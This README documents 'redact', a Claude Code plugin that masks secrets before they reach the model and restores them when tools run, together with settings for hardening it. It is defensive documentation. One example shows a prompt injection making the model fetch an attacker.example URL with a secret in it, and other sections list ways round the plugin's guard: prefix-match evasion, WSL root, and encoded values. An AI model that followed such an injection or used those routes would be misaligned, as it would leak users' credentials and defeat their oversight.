# redact

Swaps secret-shaped values and email addresses for numbered placeholders before they leave your machine, from the first request on, and puts the real values back where they run. It matches private keys (cut-short ones too), vendor tokens (`sk-`, `ghp_`, `AKIA`, `xoxb-`, JWTs and more), the value after `Bearer`, passwords in URLs, the value after `--password` or `--token`, values assigned to a name with token, secret, password or key in it, email addresses (not a git host's `git@`), and your own patterns. It is a pattern list, not a guarantee.

## Install

```
/plugin install redact --marketplace dboeter/cc-plugins
```

Answer `y` to add the marketplace, then pick a scope.

## How it works

- **Masked before it is sent**: your prompt and a slash command's arguments, the first request's context (CLAUDE.md, your account's email, the date), the system prompt, the reminders and mentioned files Claude Code injects, a skill's text, an MCP tool's description, and every row the conversation keeps: tool results, a subagent's rows too. The model reads `GITHUB_TOKEN=⟦API_KEY_n⟧`.
- **Numbered**: each rule names a content type (`PRIVATE_KEY`, `API_KEY`, `TOKEN`, `PASSWORD`, `SECRET`, `EMAIL`), which labels its placeholders unless the rule names a label of its own. Distinct values get distinct numbers. A value keeps its placeholder for the whole session, its subagents, retries and a `--resume`, and once matched it is masked wherever it comes back as a whole word, even where no rule would match it. A short value is masked that way too: a pattern that matches a 4-digit PIN masks that number everywhere it stands alone.
- **Restored where it runs**: every tool call gets the real values back in its input before it runs, so a Write, an Edit or a Bash command works on the real value. The terminal draws the real values in the transcript.
- **Kept local**: the values and their placeholders sit in a vault per session in the plugin's store, never in a request.

## What gets the real values

Every tool, remote ones included: WebFetch, WebSearch, MCP tools. That is a choice for an uninterrupted workflow, and it has a price:

- **A prompt injection can send a value out.** A page or file that tells the model to fetch `https://attacker.example/?k=⟦API_KEY_n⟧` gets the real key sent there. The placeholder keeps a value from the model, not from the services the model calls.
- **The permission check sees the real values**, as it runs after the restore. In auto mode its classifier is a model request.
- **A tool's own model request**, where it makes one (WebSearch's query, WebFetch's prompt to the model that reads the page), carries the real value.

## Use

`/redact show` (or `/redact`) opens a pane with every rule: the built-in ones by label and name, the patterns from your settings (one that does not compile is marked skipped), and your own, each with the label it masks under, a remove button, and a field to add one. On the mobile app, with no field, add from the prompt.

`/redact add <regex>` and `/redact remove <n>` do the same from the prompt, but what you type there lands in the transcript the model reads; what the pane's field takes does not. Your patterns are kept across sessions and projects.

Each match of a pattern of yours is masked whole; a lookbehind keeps a prefix: `(?<=ACME_KEY=)\S+`. Its first named group names its label, `SECRET` without one: `(?<=ACME_KEY=)(?<ACME_KEY>\S+)` masks as `⟦ACME_KEY_n⟧`. Patterns run after the built-in rules, so none can split a value a rule masks whole. More can be set in the `patterns` option, a list, so set it in settings.json (`/config` does not show list fields):

```json
"pluginConfigs": { "redact@dboeter": { "options": { "patterns": ["(?<=ACME_KEY=)\\S+"] } } }
```

## What it refuses

- **A placeholder it cannot restore**: a tool call naming a placeholder this session's vault does not hold (a number the model made up, one from another session, or a vault pruned or lost) is refused, rather than run with the placeholder in place of the value.
- **Its own config**: a call that would change its store (your patterns and the vaults) or its `enabledPlugins` and `pluginConfigs` entries in a settings file. A Write or Edit of a settings file is compared before and after, so an edit that names only `"patterns"` is caught. Bash is matched as text: a command naming the store, or a `claude/settings*.json` path and `redact`. Reading the store through Bash is refused too; the pane lists your patterns.
- **Its own failure**: when masking throws or outruns the hook's budget, what it masks is withheld: a row's text is replaced with a notice, a prompt is not sent, a command does not run, an injected reminder, a skill's text or an MCP tool's description is left out, the first request's context blocks are dropped, and the system prompt keeps only the sections that read the same for everyone. Nothing goes out unmasked.

## Harden it

The plugin's own guard is best effort: a Bash command can spell a path another way, and `claude plugin disable` turns the plugin off. Claude Code's permission rules and managed settings hold where it can't, because Claude Code enforces them itself. [`hardening/`](hardening) holds the two snippets.

### 1. Permission rules

Add the entries of [`hardening/user-settings.json`](hardening/user-settings.json) to the `permissions.deny` and `permissions.ask` lists in `~/.claude/settings.json`, after the ones you have. Claude Code applies them to the running session on save.

| Rule | What it stops |
| --- | --- |
| `Read(~/.claude/plugins/store/redact_*)` | Reading or changing the store file with the file tools, and with the Bash file commands Claude Code recognizes (`cat`, `sed`, `tee`, `>`). A Read deny also blocks Edit and Write on the path. |
| `Edit(~/.claude/plugins/store/redact_*)` | The same for NotebookEdit, which a Read deny does not cover. |
| `Bash(claude plugin disable*)`, `uninstall`, `marketplace remove` | Turning the plugin off from the CLI, which writes your settings itself, out of reach of the file rules. A prefix match: `$(which claude) plugin disable` gets past it. |
| ask `Edit(~/.claude/settings.json)`, `Edit(**/.claude/settings*.json)` | Any settings edit without you approving it. |

If `~/.claude/settings.json` is a link (to a dotfiles repo, say), also add an ask rule for its target: `readlink -f ~/.claude/settings.json` prints it. Claude Code refuses to write through the link and points Claude at the target, which none of the rules above name.

### 2. Force-enable it

A plugin that managed settings enable can't be disabled from user, project or local settings, and only root writes the managed file. In your own terminal, as `sudo` asks for your password:

```bash
sudo install -d -m 755 /etc/claude-code && echo '{ "enabledPlugins": { "redact@dboeter": true } }' | sudo tee /etc/claude-code/managed-settings.json
```

That writes [`hardening/managed-settings.json`](hardening/managed-settings.json) and replaces a managed file already there: if you have one, add the `enabledPlugins` entry to it instead. On macOS the file is `/Library/Application Support/ClaudeCode/managed-settings.json`. Installed from a marketplace under another name, the id is `redact@<that name>`.

**On WSL** root is reachable without a password through Windows interop (`/mnt/c/Windows/System32/wsl.exe -u root`), and Claude Code's docs count `/etc/claude-code` as user-writable there. Deny `Bash(/mnt/c/Windows/System32/wsl.exe*)` and `Bash(wsl.exe*)` (a prefix match again), or turn interop off with `enabled = false` under `[interop]` in `/etc/wsl.conf` and `wsl --shutdown` from Windows, which also stops running Windows programs from WSL.

### What stays open

- **The plugin's code**: a module that does not load masks nothing, so whoever can edit the folder the plugin loads from can switch it off. Installed from the marketplace, the copy that runs sits under `~/.claude/plugins/`, where Claude Code never auto-approves a write (in auto mode its classifier decides); a working copy loaded as a local directory marketplace has no such guard.
- **Bash spelled another way**: a variable, or `cd` first. The sandbox (`sandbox.enabled`, with `allowUnsandboxedCommands: false`) closes this for every command it runs: the operating system enforces the Read and Edit deny rules, however a command names the path. Commands in `excludedCommands` run outside it.
- **Shapes**: masking matches what a secret looks like, so an encoded or split value (`base64`, `rev`) gets through. A value first sent before any rule matched it stays in the rows that already carry it.
- **Images and documents**: Claude Code lets a plugin drop or move them, not change them, so a screenshot of a secret goes out as it is.
- **Other code that sees the real values**: settings hooks (PreToolUse and PostToolUse get a tool's input and output), other plugins' hooks and model calls, and telemetry that logs tool input.
- **Managed setups**: where an organization manages Claude Code, the hooks on skills' text, the first request's context, the system prompt and injected reminders run only for a plugin the organization lists in managed settings.
- **Where placeholders show**: a remote surface (the mobile app over Remote Control) keeps them, so drawing never sends a value; so do collapsed tool groups and the prompt history.
- **Context shifts**: a value is put back as it was captured. One taken from a JSON string, escapes and all, and written into a file of another format is written as captured.
- **Placeholder-shaped text**: text of a placeholder's shape that a file already holds reads as one: its number, if the vault holds it, is restored to that value on write.

## What it does on your machine

- **Storage**: in the plugin's store, `~/.claude/plugins/store/redact_*.json`: your patterns, one list for every project, and a vault per session, holding that session's real values in plain text. A vault untouched for 30 days is dropped when a session starts; a `--resume` of that session then refuses its placeholders.
- **Files**: it reads a settings file that a Write or Edit is about to change, to compare its own entries before and after. It writes nothing but its store. The transcript file keeps a tool's own record (what the terminal draws, a Read's file content say) as the tool made it; what the model is sent is masked.
- **Network**: nothing.
